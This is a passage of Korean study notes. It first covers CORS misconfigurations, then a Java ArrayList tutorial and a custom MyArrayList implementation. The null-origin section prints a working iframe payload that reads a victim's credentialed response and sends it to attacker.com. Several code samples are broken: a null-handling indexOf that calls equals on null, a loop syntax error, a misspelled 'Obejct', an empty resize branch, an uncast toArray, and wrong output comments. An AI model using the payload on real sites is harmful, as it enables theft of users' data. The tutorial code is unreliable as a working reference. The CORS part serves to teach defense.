그대로  Access-Control-Allow-Origin 헤더에 넣는 방식이다.

길게 설명할 필요없이 개발자의 게으름에 의해 발생되는 보안 취약점이며 이러한 로직의 사용을 지양하여야 한다.

/* Node.js */(클라이언트측)

app.get('/users', (req, res) => {

    res.header("Access-Control-Allow-Origin", req.headers.origin); //헤더에있는 출처를 그대로 등록
    // ...
}

/* Spring */(서버측)

@Component
public class SimpleCorsFilter implements Filter {

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        
        response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
        // ...
    }

	// ...
}

```
```
3. NULL 출처 허용 금지
가끔 로컬 환경에서 개발하고 테스트할때 Origin이 null로 넘어와서(로컬 리소스 요청 시 발생), 
서버에서 Access-Control-Allow-Origin 헤더에 null을 설정하고 개발을 이어나가다, 
개발이 완료되면 그대로 배포하는 일이 일어난다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/88.PNG" width="650" height="600" /><br><br>

```
Origin: null은 간단하게 뚫릴 수 있다.

예를들어, iframe을 통한 공격이 있다.
iframe 은 html을 페이지에 삽입 해주는 것 뿐만 아니라, 
src 값에 javascript: 나 data: 등을 넣어 스크립트를 실행하게할 수 있게 할 수 있다.

만일 이런식으로 iframe 내부에서 요청을 보내게 된다면 Origin은 자동으로 null로 되어서 서버로 보내지게 된다.

//공격자가 넣은 iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
   <script>
      var xhr = new XMLHttpRequest();
      xhr.onload = reqListener; //아래 웹페이지를 오픈할때 함수 발동
      xhr.open('get', 'https://vulnerable.com/path_to_get_data', true); // 취약한 서버로 ajax 요청을 보냄
      xhr.withCredentials = true;
      xhr.send();
      
      function reqListener() { //ajax에서 받은 응답데이터를 확인가능하다.
         location='https://attacker.com/getdata?restxt='+encodeURIComponent(this.responseText);
      };
   </script>">
</iframe>
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/89.PNG" width="650" height="600" /><br><br>

```
1. 피해자가 웹브라우저를 통해 공격사이트 attacker.com 에 접속한다
2. attacker.com에 임베디드되어있는 iframe에 있는 스크립트를 통해 포털사이트에
   쿠키를 담아 사용자 정보를 조회하는 요청을 몰래 보낸다.
3. 이때 브라우저의 Origin은 null로 처리되어 보내지게 된다.
4. 만일 서버에서 null에 대해 출처를 허용하도록 처리했다면 정상 응답을 하게 된다.
5. 피해자의 개인정보를 attacker.com 에 쿼리스트링으로 넣어 전송한다.
```

```
4. 정규식으로 처리할것이면 조심히
효율적인 코드 작성을 위해 도메인을 정규식으로 처리하는 경우도 존재한다. 

예를들어 다음과 같은 도메인에 대한 정규식이 있다고 하자. 
상위 도메인 example.com 의 하위 도메인에게만 접근을 허용하도록 처리된 식이며, 
나중에 추가될 여러가지 하위 도메인들에 대해 서버 코드 수정없이 유연하게 처리도 가능하다.

const regex = /[a-z]+.example.com/g

하지만 위의 정규표현식은 적절하지 않다.

정규식의 본래 의도인 하위 도메인에게만 접근을 허용하는건 문제 없지만,
[a-z]+ 다음에 있는 .(점)이 문제다.
정규표현식에서 점(.)은 모든 문자를 뜻하기 때문이다.

attackerexample.com
superpowerexample.com 다 가능하다.

결국 공격자는 attackerexample.com 도메인을 새로 준비하기만 하면 서버의
필터링 로직은 손쉽게 뚫리게 되는 결과를 낳게된다.

해결방법은 점(.)을 이스케이프 처리하여 문자화 시키는 것이다.

const regex = /[a-z]+\.example.com/g

이렇게 되면 www.example.com, blog.example.com 이런식으로 받을 수 있다.

```

```
5. 화이트 리스트 사용
결국은 어딘가의 배열이나 리스트에 허용할 출처들을 저장해놓고
관리하는 것이 가장 좋다.

따라서 요청을 전송한 출처가 화이트 리스트에 있는 도메인 목록에 있는 경우에만 
Access-Control-Allow-Origin 헤더에 해당 출처를 지정하는 식으로 백엔드 개발자는 하드 코딩을 조금 해야한다.

```

```
#) 자바의 컬렉션 
자바의 컬렉션 프레임워크를 접한다면 가장 먼저 배우는 컬렉션이 ArrayList 일 것이다.

1. 연속적인 데이터의 리스트 (데이터는 연속적으로 리스트에 들어있어야 하며 중간에 빈공간이 있으면 안된다)
2. ArrayList 클래스는 내부적으로 Object[] 배열을 이용하여 요소를 저장
3. 배열을 이용하기 때문에 인덱스를 이용해 요소에 빠르게 접근할 수 있다.
4. 크기가 고정되어있는 배열과 달리 데이터 적재량에 따라 가변적으로 공간을 늘리거나 줄인다.
5. 그러나 배열 공간이 꽉 찰때 마다 배열을 copy하는 방식으로 늘리므로 이 과정에서 지연이 발생하게 된다.
6. 데이터를 리스트 중간에 삽입/삭제 할 경우, 중간에 빈 공간이 생기지 않도록 
   요소들의 위치를 앞뒤로 자동으로 이동시키기 때문에 삽입/삭제 동작은 느리다. 
   따라서 조회를 많이 하는 경우에 사용하는 것이 좋다
```

```
#) ArrayList vs 배열(Arrays) []
배열 장단점

처음 선언한 배열의 크기(길이)는 변경할 수 없다. 이를 정적 할당(static allocation)이라고 한다.
데이터 크기가 정해져있을 경우 메모리 관리가 편하다.
메모리에 연속적으로 나열되어 할당하기 때문에 index를 통한 색인(접근)속도가 빠르다.
index에 위치한 하나의 데이터(element)를 삭제하더라도 해당 index에는 빈공간으로 계속 남는다. 
배열의 크기를 변경할 수 없기 때문에, 처음에 너무 큰 크기로 설정해주었을 경우 메모리 낭비가 될수 있고, 
반대로 너무 작은 크기로 설정해주었을 경우 공간이 부족해지는 경우가 발생 할 수 있다.

Number[] r = new Number[5]; // 정적 할당(static allocation)
r[0] = 10;
r[1] = 20;
r[2] = 30;
r[3] = 40;
r[4] = 50;

r[3] = null; // 배열은 삭제 메서드가 없어서 null을 이용해 객체 요소를 삭제
System.out.println(Arrays.toString(r)); // [10, 20, 30, null, 50]
```

```
#)ArrayList 장단점

리스트의 길이가 가변적이다. 이를 동적 할당(dynamic allocation)이라고 한다.
배열과 달리 메모리에 연속적으로 나열되어있지 않고 
주소로 연결되어있는 형태이기 때문에 index를 통한 색인(접근)속도가 배열보다는 느리다.
데이터(element) 사이에 빈 공간을 허용하지 않는다.
객체로 데이터를 다루기 때문에 적은양의 데이터만 쓸 경우 배열에 비해 차지하는 메모리가 커진다.

Tip)primitive type인 int 타입일 경우 크기는 4Byte 이다.
반면에 Wrapper 클래스인 Integer는 32bit JVM 환경에서는, 
객체의 헤더(8Byte), 원시 필드(4Byte), 패딩(4Byte)으로 '최소 16Byte 크기를 차지한다. 
또한 이러한 객체 데이터들을 다시 주소로 연결하기 때문에 16 + α 가 된다.

javaList<Number> l = new ArrayList<>(); // 동적 할당(dynamic allocation)
l.add(10);
l.add(20);
l.add(30);
l.add(40);
l.add(50);

l.remove(3);
System.out.println(l); // [10, 20, 30, 50]
```

```
#)ArrayList 객체 생성
// 타입설정 Integer 객체만 적재가능
ArrayList<Integer> members = new ArrayList<>();

// 초기 용량(capacity)지정
ArrayList<Integer> num3 = new ArrayList<>(10);

// 배열을 넣어 생성
ArrayList<Integer> list2 = new ArrayList<>(Arrays.asList(1,2,3));

// 다른 컬렉션으로부터 그대로 요소를 받아와 생성 
(ArrayList를 인자로 받는 API를 사용하기 위해서 Collection 타입 변환이 필요할 때 많이 사용)

ArrayList<Integer> list3 = new ArrayList<>(list2);


ArrayList 생성 문법을 보면 꺾쇠 괄호 <> 기호를 이용해 타입을 지정함을 볼 수 있다. 
저 꺾쇠 괄호가 바로 제네릭Visit Website이다.

만일 꺾쇠 괄호 안에 String 타입명을 기재하면 
ArrayList 클래스 자료형의 타입은 String 타입으로 
지정되어 문자열 데이터만 리스트에 적재할 수 있게 된다.

아래 그림과 같이 배열과 리스트의 선언문 형태를 비교해보면 이해하기 쉬울 것이다. 
선언하는 키워드나 문법 순서가 다를뿐, 결국 자료형명을 선언하고 자료형의 타입을 지정한다는 점은 같다고 볼 수 있다.


String[] array = new String[10];
ArrayList<String> list = new ArrayList<> //초기 default는 길이 10이다.\
```

```
#) ArrayList 요소추가
그리고 ArrayList를 처음 접할때 용량(capacity)과 크기(size)에 대한 용어 차이가 모호할 수 있는데, 
capacity는 리스트의 공간 용량라고 보면되고, size는 리스트 안에 들어있는 요소들의 총 갯수라고 이해하면 된다.

boolean add(Object obj) : ArrayList의 마지막에 객체를 추가, 추가에 성공하면 true를 반환
void addAll(Collection c) : 주어진 컬렉션의 모든 객체를 저장한다.

ArrayList<String> list = new ArrayList<>(10); // 용량(capacity)를 10으로 설정

list.add("A");
list.add("B");
list.add("C");
list.add("D");
list.add("E");
list.add("F");

list.size(); // 크기(size)는 6 (들어있는 요소의 총 개수)
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/90.PNG" width="650" height="400" /><br><br>

```
또한 addAll() 메서드를 통해 일일이 요소를 추가하는게 아닌 컬렉션 자체를 그대로 받아와
추가도 가능하다

javaArrayList<String> list1 = new ArrayList<>();
list1.add("1");
list1.add("2");

ArrayList<String> list2 = new ArrayList<>();
list2.add("3");
list2.add("4");

list1.addAll(list2); // list1에 list2의 내용을 추가한다.
 
System.out.println(list1); // [1, 2, 3, 4]
```

```
#)ArrayList 요소 삽입
리스트에 데이터를 추가하되 추가되는 위치를 지정하여 삽입할 수 있다.

이때 지정된 위치에 요소를 넣을수 있게 기존의 요소들이 한칸씩 뒤로 이동되면서 빈공간을 만들어준다.
유의할점은 한칸씩 데이터들을 뒤로 밀어내는 
동작은 꽤나 비용이 크기 때문에 ArrayList의 사이즈가 커질 수록 비효율적이 된다. 
(이는 ArrayList 컬렉션의 단점이기도 하다)

ArrayList<String> list = new ArrayList<>(8); 

list.add("1");
list.add("2");
list.add("3");
list.add("4");
list.add("5");

// 3번째 인덱스 자리에 요소 삽입
list.add(3, "A");

System.out.println(list); // [1, 2, 3, A, 4, 5]
```

```
#)ArrayList 삽입 주의점
위치를 지정하여 삽입할 때 인덱스가 리스트의 capacity(용량)를 넘지 않도록 해야한다.

또한, 마지막위치에 벗어나도 에러가 발생한다.
예를들어 다섯번째요소까지 들어가있는데 한칸 건너뛰고 일곱번째요소에 넣을려고 하면
용량에 맞춰도 에러가 난다.

용량에 맞춰 삽입하는데 무슨 문제가 있느냐 싶겠지만, 
위에서 ArrayList의 특징에 대해 다뤘듯이 
ArrayList는 데이터가 연속된 자료구조 라는 규칙이 정해져 있기 때문에 이러한 행위는 불가능하다.

즉, 리스트의 물리적인 공간의 크기(capacity)는 8이므로 충분하더라도 논리적인 공간(size)은 5이기 때문에 7번째 공간에 값 삽입은 논리적인 공간(size)을 넘을 수 없어 불가능다는 해석이 된다.
따라서 논리적인 공간을 넘어 접근할 경우 IndexOutOfBoundsException이 발생하는 것이다.
```

```
#)ArrayList 요소삭제
요소의 삭제 역시 중간에 위치한 요소를 제거할 경우, 나머지 요소들이 빈공간을 채우려
앞쪽에 이동되게 된다.

ArrayList<String> list = new ArrayList<>(8); 

list.add("1");
list.add("2");
list.add("3");
list.add("4");
list.add("5");

// 2번째 인덱스 자리의 요소 삭제
list.remove(2);

System.out.println(list); // [1, 2, 4, 5] (앞쪽으로 떙긴다는게 중요)
```

```
만일 모든 값을 싹 제거하려면, 일일히 반복문을 돌려 제거하지말고 간단히 clear()메소드를
사용하면 된다.

ArrayList<String> list1 = new ArrayList<>();
list1.add("1");
list1.add("2");
list1.add("3");
 
list1.clear(); // list1의 데이터를 모두 비운다.

System.out.println(list1); // []
```
```
#)ArrayList 요소 검색
ArrayList<String> list1 = new ArrayList<>();
list1.add("A");
list1.add("B");
list1.add("C");
list1.add("A");

// list에 A가 있는지 검색 : true
list1.contains("A"); 

// list에 A가 있는지 순차적으로 검색하고 index를 반환 (만일 없으면 -1)
list1.indexOf("A"); // 0

// list에 A가 있는지 역순으로 검색하고 index를 반환 (만일 없으면 -1)
list1.lastIndexOf("A"); // 3
```
```
#)ArrayList 요소 얻기
개별 단위 요소 얻을 떄 get
ArrayList<String> list = new ArrayList<>(18); 

list.add("1");
list.add("2");
list.add("3");
list.add("4");
list.add("5");

list.get(0); // "1"
list.get(3); // "4"

#)범위요소
List subList(int fromIndex, int toIndex) 메서드 사용

ArrayList<String> list = new ArrayList<>(18); 

list.add("P");
list.add("r");
list.add("o");
list.add("g");
list.add("r");
list.add("a");
list.add("m");

// list[0] ~ list[6] 범위 반환
list.subList(0, 7); // [P, r, o, g, r, a, m]

// list[3] ~ list[6] 범위 반환
list.subList(3, 7); // [g, r, a, m]

// list[3] ~ list[5] 범위 반환
list.subList(3, 6); // [g, r, a]
```

```
#)ArrayList 요소 변경
ArrayList<String> list1 = new ArrayList<>();

list1.add("list1");
list1.add("list1");
list1.add("list1");
 
// index 1번의 데이터를 문자열 "setData"로 변경한다.
list1.set(1, "setData"); 

System.out.println(list1); // [list1, setData, list1]
```

```
#)ArrayList 용량 확장
ArrayList는 생성할 때 용량이 정할 수 있지만, 데이터가 추가 되면서 자동으로 용량(capacity)을
늘려준다.

만일 정해진 용량보다 넘게 데이터를 적재할 경우, 
자체적으로 내부 배열을 큰 사이즈로 새로 만들고 기존의 배열에서 요소들을 복사함으로써, 
간접적으로 리스트의 용량을 확장시키게 된다. 

하지만 이러한 가변적인 동작은 리스트를 다루는데에는 편하지만, 
배열 복사 동작 자체가 성능이 그리 좋지않아 오버헤드(Overhead)를 발생 시키게 된다.

ArrayList<String> list = new ArrayList<>(10); // 용량(capacity)를 10으로 설정

// 용량 10을 넘은 요소 13개 추가
list.add("A");
list.add("B");
list.add("C");
list.add("D");
list.add("E");
list.add("F");
list.add("G");
list.add("H");
list.add("I");
list.add("J");
list.add("K");
list.add("L");
list.add("M");

list.size(); // 크기(size)는 13 : 자동으로 용량이 증가되어 데이터를 적재함
```

```
따라서 사용될 데이터의 개수를 미리 알고 있는 경우라면 
애초에 ArrayList를 만들 때부터 큰 값으로 만들어주면 된다. 

그러면 배열이 복사하면서 발생하는 오버헤드를 피할 수 있어 성능저하를 방지할 수 있게 된다.

혹은 ensureCapacity() 메서드를 이용해 리스트의 최소 용량을 재지정함으로써 
실행 중간에 리스트의 용량을 늘릴수도 있다.

ArrayList<String> list = new ArrayList<>(5); 

list.add("1");
list.add("2");
list.add("3");
list.add("4");
list.add("5");

list.ensureCapacity(10); // 최소 용량이 5에서 10으로 재지정

list.add("6");
list.add("7");

System.out.println(list); // [1, 2, 3, 4, 5, 6, 7]
```

```
#)ArrayList 복사
ArrayList<Integer> number = new ArrayList<>();
number.add(1);
number.add(2);
number.add(5);

//ArrayList는 내부적으로 Object[] 배열로 저장하기 때문에 형변환이 필요함
ArrayList<Integer> cloneNumber = (ArrayList<Integer>) number.clone();

System.out.println("ArrayList: " +number); //[1,3,5]
System.out.println("Cloned ArrayList: " + cloneNumber); //[1,3,5] 
```

```
//배열 = array(크키고정)
//리스트 = List(가변크기)

#)ArrayList배열 변환
- Object[] toArray() : ArrayList에 저장된 모든 객체들을 배열로 반환한다.
- Object[] toArray(Object[] objArr) : ArrayList에 저장된 모든 객체들을 배열 objArr에 담아 반환한다.

ArrayList<String> languages = new ArrayList<>();
languages.add("java");
languages.add("Python");
languages.add("C");

/* ArrayList<String> 을 String[] 배열로 변환 */

// 방법 1 : 배열로 변환하고 반환
String[] arr1 = languages.toArray();

// 방법 1 : 매개변수로 지정된 배열에 담아 바환
String[] arr2 = new String[languages.size()]; // 먼저 리스트 사이즈에 맞게 배열 생성
languages.toArray(arr2); //arr2에 저장

```

```
#)ArrayList 정렬
ArrayList를 정렬할 때 주의할 점은 sort()메서드는 정렬된 값을 반환하는 것이 아닌,
원본리스트자체를 변경시킨다.

- void sort(Comparator c);

ArrayList list1 = new ArrayList();
list1.add("3");
list1.add("2");
list1.add("1");
 
// 오름차순 정렬
list1.sort(Comparator.naturalOrder());
System.out.println(list1); // [1, 2, 3]

// 내림차순 정렬
list1.sort(Comparator.reverseOrder());
System.out.println(list1); // [3, 2, 1]
```

```
#) ArrayList 순회
보통 ArrayList의 요소들을 순회하면 for문을 쓸 텐데
ArrayList<Integer> list = new ArrayList<Integer>();
list.add(1);
list.add(2);
list.add(3);
list.add(4);

for(Integer i : list) { 
    System.out.println(i);
}
```

```
#) ArrayList 이터레이터
다만 몇몇 컬렉션에서는 저장된 요소를 Iterator인터페이스로 읽어오도록 하는 순회패턴을
지향하기도 한다.

- Iterator iterator() : ArrayList의 Iterator 객체를 반환
- ListIterator listlterator() : ArrayList의 ListIterator를 반환
- ListIterator listIterator(int index): ArrayList의 지정된 위치부터 시작하는 ListIterator를 반환한다.

Collection 인터페이스에서는 Iterator인터페이스를 구현한 클래스의 인스턴스를 반환하는
iterator() 메서드를 정의하여 각 요소에 접근하도록 정의하고 있다.

따라서 Collection 인터페이스를 상속받는 List나 Set 인터페이스에서도 
iterator() 메소드를 사용할 수 있다. (Map은 X)

//이터레이터 객체 반환
Iterator<Integer> iter = lnkList.iterator();

//만일 다음 요소가 있을 경우 반복
while(iter.hasNext()) {
	System.out.println(iter.next()); //요소를 출력하고 반복위치를 이동
}

또한 ArrayList에는 Iterator 뿐만 아니라 리스트 전용 이터레이터 객체인 ListIterator도 지원한다.

ListIterator 인터페이스는 Iterator 인터페이스를 상속받아 여러 기능을 추가한 인터페이스로서, 
Iterator는 컬렉션의 요소에 접근할 때 단 방향으로만 이동할 수 있는 반면, 
ListIterator 인터페이스는 컬렉션 요소의 대체, 
추가 그리고 인덱스 검색 등을 위한 작업에서 양방향으로 이동하는 것을 지원하여 더욱 쓰임새가 넓다.

그리고 Iterator는 Collection 인터페이스를 구현한 컬렉션에서 모두 사용할수 있는 반면, 
ListIterator는 오로지 List 컬렉션에서만 사용이 가능하다.

// ListIterator 객체 반환
ListIterator<Integer> iter = lnkList.listIterator();

// 만일 다음 요소가 있다면 반복
while (iter.hasNext()) {
    System.out.println(iter.next()); // 요소를 출력하고 반복 위치를 뒤로 이동
} 

// -- 리스트를 끝까지 순회한 상태

// 만일 이전 요소가 있다면 반복
while (iter.hasPrevious()) {
    System.out.println(iter.previous()); // 요소를 출력하고 반복 위치를 앞으로 이동
}
```

```
#) ArrayList 직접구현
- List 인터페이스 정의 
실제로 ArrayList 클래스는 List 인터페이스를 implements 하여 구현하기 때문에 
본 포스팅에서도 이와 비슷하게 인터페이스를 구현하고 추상 메소드를 재정의 해보며, 
이른바 클론 데이터 스트럭쳐 코딩을 해보는 시간을 가져볼것이다.

다음은 실제 List 인터페이스에 정의되어 있는 추상 메소드들 중 
핵심적인 부분만 발췌하여 나만의 인터페이스인 MyList로 제네릭을 이용하여 정의하였다. 
이 MyList 인터페이스를 implements 하여 나만의 MyArrayList를 만들어보자.

//내가만든 인터페이스
public interface MyList<T> {

    boolean add(T value); // 요소를 추가
    void add(int index, T value); // 요소를 특정 위치에 추가

    boolean remove(Object value); // 요소를 삭제
    T remove(int index); // 특정 위치에 있는 요소를 삭제

    T get(int index); // 요소 가져오기
    void set(int index, T value); // 특정 위치에 있는 요소를 새 요소로 대체

    boolean contains(Object value); // 특정 요소가 리스트에 있는지 여부를 확인
    int indexOf(Object value); // 특정 요소가 몇 번째 위치에 있는지를 반환 (순차 검색)
    int lastIndexOf(Object o); // 특정 요소가 몇 번째 위치에 있는지를 반환 (역순 검색)

    int size(); // 요소의 개수를 반환
    boolean isEmpty(); // 요소가 비어있는지
    
    public void clear(); // 요소를 모두 삭제
}

public class MyArrayList<E> implements MyList<E> {}
```

```
#)클래스 필드 정의하기
public class MyArrayList<E> implements MyList<E> {
	private static final int DEFAULT_CAPACITY = 5; //생성자로 배열이 생성될 때 기본 용량
	private static final Object[] EMPTY_ELEMENTDATA = {}; //빈배열

	private int size; //아래의 elementData 배열의 총 개수(크기)를 나타내는 변수
	Object[] elementData; //자료를 담을 배열
	//...
}

ArrayList클래스에 데이터들을 저장하기 위해 내부에 Object 배열이 구현되어 있다.
이 내부 배열을 가지고 메서드로 조작하여 리스트 자료를 이용하는 것이다.

그런데 여기서 가장 중요한 멤버가 바로 size 변수이다. 
size는 배열의 크기를 나타내는 변수인데, 
어차피 elementData.length로 곧바로 배열의 크기를 얻을수 있음에도 불구하고 따로 변수로 분리한 이유는, 
자료를 담은 배열 elementData의 크기가 MyArrayList 클래스의 크기를 대변해주지 못하기 때문이다. 

예를들어 데이터를 add 한다고 하면 배열이 꽉차있는지 비어있는지 확인을하고 추가해야 되는데, 
이러한 검사를 size 변수의 값을 비교를 통해 처리하기 때문이다. 또한 적재할 인덱스 위치값으로도 쓰여진다.

Tip) 리스트의 capacity와 size의 차이를 혼동하면 안된다.
capacity는 배열의 전체공간 용량, size는 배열의 모든 요소의 개수
```

```
#)생성자 구현하기
자바의 ArrayList 사용법을 보면 인스턴스화 할때 파라미터를 주기도하고 주지 않기도 한다.

파라미터를 줄 경우 미리 지정한 수만큼 공간(capacity)을 할당하는데, 
이를 구현하기 위해 생성자를 overloading 처리한다.
또한 사용자가 파라미터에 옳지 않은 값을 줄수도 있으니 이를 캐치하여 잘 분기 처리하여야 한다.(아래 생성자 부분 참조)

MyArrayList<Object> list2 = new MyArrayList<>();

MyArrayList<Object> list1 = new MyArrayList<>(50);

MyArrayList<Object> list2 = new MyArrayList<>(0);

MyArrayList<Object> list3 = new MyArrayList<>(-50);
```

```
// 생성자 (넘겨받는 인자가 없으면 -> 초기 공간 할당 시에 5로 고정)
public MyArrayList() {
    this.elementData = new Object[DEFAULT_CAPACITY]; // 디폴트 용량으로 초기화
    this.size = 0;
}

// 생성자 (초기 공간 할당 O)
public MyArrayList(int capacity) {

    // 파라미터의 값이 양수일 경우 그대로 용량으로 배열을 생성
    if (capacity > 0) {
        this.elementData = new Object[capacity];
    }
    // 파라미터의 값이 0일 경우 인자를 주지 않고 인스턴스화 한 것과 같으니 디폴트 용량으로 초기화
    else if (capacity == 0) {
        this.elementData = new Object[DEFAULT_CAPACITY];
    }
    // 파라미터의 값을 음수로 설정할 경우 예외를 발생시키도록 안전하게 설계
    else if (capacity < 0) {
        throw new RuntimeException(new IllegalAccessException("리스트 용량을 잘못 설정 하였습니다")); \
		// Checked 예외를 Unchecked 예외로 변환
    }

    this.size = 0;
}
```
```
#)resize 구현하기
리스트와 배열의 가장 큰차이는 가변이냐 아니냐이다.

만일 용량(capaciy)가 꽉 차서 빈공간이 없는데 새로운 데이터가 들어오면 배열의 용량을 늘릴 필요가 있다. 
반대로 데이터를 삭제해서 들어있는 데이터 갯수에 비해 용량이 너무 크다면 
배열을 용량을 줄여 메모리적으로 최적화를 노릴 수도 있다.

resize() 메서드는 리스트에 요소가 추가, 삭제 등의 동작이 될때 기본적으로 호출된다. 
그리고 배열의 크기(size)와 배열의 용량(capaciy)을 비교하여, 
크거나 작은 경우 이를 감지해서 리사이징을 처리하여 메모리 최적화를 노린다고 보면 된다.

다음과 같이 배열에 데이터가 추가/삭제 될때마다 실행되는 resize() 내부용 메소드 구현하고, 
size와 capacity를 비교하는 총 3가지의 분기를 구현해준다.

다음과 같이 배열에 데이터가 추가/삭제 될때마다 
실행되는 resize() 내부용 메소드 구현하고, 
size와 capacity를 비교하는 총 3가지의 분기를 구현해준다.

private void resize() {
	int element_capacity = elementData.length; //현재 배열의 크기를 얻음

	//용량이 꽉찬 경우
	if()

	//용량에 비해 데이터 양이 작은 경우
	if()

	//들어있는 데이터가 하나도 없을경우(빈 배열)
	if()
}

```
```
1. 용량이 꽉 찬 경우
아래 코드에서 용량의 2배로 설정하는 이유는 넉넉하게 공간을 유지하기 위해서이다. 
왜냐하면 resize 메서드가 자주 호출되어 배열을 복사하여 새로 만드는 행위가 빈번히 일어난다면 
성능에 마이너스가 될 수 있기 때문이다. 

빈 공간은 자동으로 null로 채워지기 때문에 문제는 없다.
다만 자료구조 알고리즘에 따라 확장 기준이 다를수 있다는 점은 유의하자. 

// 용량이 꽉찬 경우
if (element_capacity == size) {
    int new_capacity = element_capacity * 2; // 넉넉하게 공간을 유지하기 위해 현재 용량의 두배로 설정

    elementData = Arrays.copyOf(elementData, new_capacity); // 복사할 배열을 new_capacity 용량 만큼 설정하고 elementData 원소들을 전체 복사해서 넣고 반환 (빈공간은 null)
    return;
}
```

```
2. 용량에 비해 데이터 양이 적은 경우
적정한 공간을 유지하다 너무 배열 원소가 공간에 비해 적게 들어있을 경우 최적화를 위해
리사이징 하는 작업이다.

크기 계산 기준은 현재 배열 원소 갯수(size)가 현재 배열 용량(capacity)의 절반 보다 작을 경우로 정하였다. 
그리고 배열을 복사할때 축소할 배열의 용량을 정할때 Math.max() 메서드를 이용하였는데, 
위에서 리스트의 기본 할당 용량을 정하였으니, 
이에 대한 원칙을 따르기 위해 절반으로 줄인 용량보다 기본 용량이 더 클 경우 기본 용량으로 설정하기 위해서다.

// 용량에 비해 데이터 양(size)이 적은 경우
if ((element_capacity / 2) > size) { //즉, 용량을 절반으로 잘라도 클 때
    int half_capacity = element_capacity / 2;

    return;
}
```

```
3. 들어있는 데이터가 하나도 없을 경우
만일 clear() 와 같은 데이터 전체 삭제를 실행할 경우, 
더이상 들어있는 배열 원소가 없으니 이때 디폴트 용량으로 배열을 초기화 한다. 
이때 빈배열인 것을 확인하기 위해 Arrays.equals() 메서드를 이용해 비교를 한다.

//들어있는 데이터가 하나도 없을 경우(빈 배열일 경우)
if(Arrays.equals(elementData, EMPTY_ELEMENTDATA)) { //elementData와 EMPTY_ELEMENTDATA가 같을 떄
	elementData = new Obejct[DEFAULT_CAPACITY]; //기본 용량으로 초기화
	return;
}
```
```
#)add구현하기
- add(E value), add(int index, E value);
먼저 add(E value) : 끝부분에 추가

@Override
public boolean add(Object value) {
	resize(); //현재 배열이 꽉 차있는 상태이면 리사이징
	
	elementData[size] = value; 
	// size가 원소의 갯수이고, 배열의 인덱스는 0부터 시작하니 결국 추가할 수 있는 마지막 위치를 가리키게 된다.


    size++; // 원소가 추가되었으니, 배열 크기를 나타내는 size도 올린다.
    return true;
}
```
```
#)add 구현하기
- add(int index, E value)
중간에 데이터를 삽입하는 것은 기본 삽입보다 확인해야할 절차가 약간 있다.
왜냐하면 리스트는 데이터가 연속되어 저장되어 있는 배열인데 
중간에 빈공간이 있는 채로 요소가 들어있거나 음수가 들어로면 안되기 때문이다.

1. 매개변수로 받아온 인덱스 범위가 음수와 같은 옳지 않은 값이 올 경우 (index < 0)
2. 매개변수로 받아온 인덱스 범위가 현재 배열 용량(capacity)보다 초과 되거나, 
   중간에 빈공간이 남은채로 끝 부분에 추가 하는지 (index > size)

@Override
public void add(int index, Object value) {
	//인덱스가 음수이거나, 배열 크기(size)를 벗어난 경우 예외 발생
	if(index < 0 || index > size) {
		throw new IndexOutOfBoundsException();
	}
	//요소가 1 2 3 4 5
	//인덱스 0 1 2 3 4   따라서 인덱스가 요소 보다 크면 안된다.
}


만일 요소 중간에 데이터를 삽입한다고 하면, 
기존 원소들에 대해 한칸씩 옆으로 이동하는 절차를 구현하여야 한다. 
그래야 빈공간이 중간에 생기게 되고 그곳에 값을 삽입할 수 있기 때문이다.

@Override
public void add(int index, Object value) {
    // 요청받은 인덱스가 음수이거나, 배열 크기(size)를 벗어난 경우 예외 발생 (리스트는 데이터가 연속되어야함)
    if (index < 0 || index > size) {
        throw new IndexOutOfBoundsException();
    }

    // 인덱스가 마지막 위치일 경우
    if (index == size) {
        add(value); // 그냥 추가
    }
    // 인덱스가 중간 위치를 가리킬 경우
    else {
        resize(); // 현재 배열이 꽉 차있는 상태이면 리사이징해서 공간넓혀주고

        // 루프변수에 배열 요소크기를 넣고, index 위치 까지 순회해서 요소들 한 칸 씩 뒤로 밀어 빈 공간 만들기
        for (int i = size; i > index; i--) {
            elementData[i] = elementData[i - 1]; //길이늘린 마지막칸에 = 마지막 요소를 넣어라
        }
        elementData[index] = value; // index 위치에 요소 할당
        size++;
    }
}
```

```
#)indexOf 구현하기
- indexOf(Object value) : 순차대로 검색해서 위치반환
- LastindexOf(Object value): 거꾸로 검색해서 위치반환

만일 찾고자 하는 값이 배열에 중복으로 여러개 들어있으면, 
가장 먼저 검색되는 요소의 위치를 반환한다. 
그리고 만일 찾고자 하는 값이 없을 경우 -1 을 반환하도록 설정한다.

유의해야 할 점은 컬렉션에는 무조건 객체만 들어올 수 있기 때문에 
요소끼리 비교할 때는 동등 연산자(==)가 아니라 반드시 equals() 메서드로 비교해야 한다. 
동등 연산자를 쓰면 객체의 주소값을 비교하는 것이기 때문이다.
```

```
#)indexOf(Object value) //기존에 indexOf도 젤 처음 찾은 index를 반환하기때문에 똑같이 구현했음.
ArrayList는 유한한 값과 더불어 null도 저장할 수 있는 자료구조이다.
그렇기 때문에 null값이 들어오면 null에 해당하는 인덱스를 반환해야한다.

그런데, null 비교같은 경우 동등연산자로 해야되니까
어쩔 수 없이 매개변수가 null일 경우 실질 값인 case를 나눠야한다.

@Override
public int indexOf(Object value) {
	//매개변수가 null일 경우 
	if(value == null) {
		for(int i=0; i<size; i++;) {
			if(elementData[i].equals(value)) {
				return i; //인덱스 반환
			}
		}
	}else {
		for(int i = 0; i<size; i++) {
			if(elementData[i].equals(value)) {
				return i;
			}
		}
	}
	return -1; //찾은 값이 없을 경우
}

```

```
#)LastindexOf(Object value)
순차 검색이 0 에서 size 미만까지 검색한 것이니, 
역순 검색은 그 반대인, size - 1 서부터 0 까지 순회하며 
검색하면 역순 로직을 구현할 수 있다.

@Override
public int lastIndexOf(Object value) {
